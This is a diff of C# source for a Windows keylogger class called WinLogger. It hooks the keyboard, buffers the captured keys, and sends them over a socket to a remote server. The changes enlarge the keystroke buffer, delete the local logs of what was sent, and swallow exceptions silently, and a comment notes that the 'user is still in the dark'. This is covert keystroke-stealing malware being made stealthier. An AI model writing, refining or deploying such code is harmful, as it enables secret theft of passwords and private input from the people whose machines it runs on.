@@ -26,7 +26,7 @@ public class WinLogger
     private static LowLevelKeyboardProc proc = KeyLogging;
     private static IntPtr hookInt = IntPtr.Zero;
 
-    private const int maxBufferSize = 5;
+    private const int maxBufferSize = 256;
     private static Keys[] userBuffer = new Keys[maxBufferSize];
     private static int bufIndex = 0;
     
@@ -84,16 +84,15 @@ public class WinLogger
                 // Send the data through the socket.  
                 int bytesSent = server.Send(msg);
 
-                File.AppendAllText(@"C:\Users\IEUser\sent.txt", concatBuf+"<EOF>");
-
                 // Release the socket.  
                 server.Shutdown(SocketShutdown.Both);  
                 server.Close();
             } catch (Exception e) {
-                File.AppendAllText(@"C:\Users\IEUser\exceptions.txt", e.ToString());
-                /* If something goes wrong, oh well. At least user is still in the dark. */
+                /* If something goes wrong, oh well. At least user is still in the dark.
+                    Uncomment below line for debugging exceptions. */
+                //File.AppendAllText(@"C:\Users\IEUser\Downloads\exceptions.txt", e.ToString());
             }
-        } catch (Exception e) {File.AppendAllText(@"C:\Users\IEUser\exceptions.txt", e.ToString());}
+        } catch (Exception) {}
     }
     
     //These Dll's will handle the hooks.
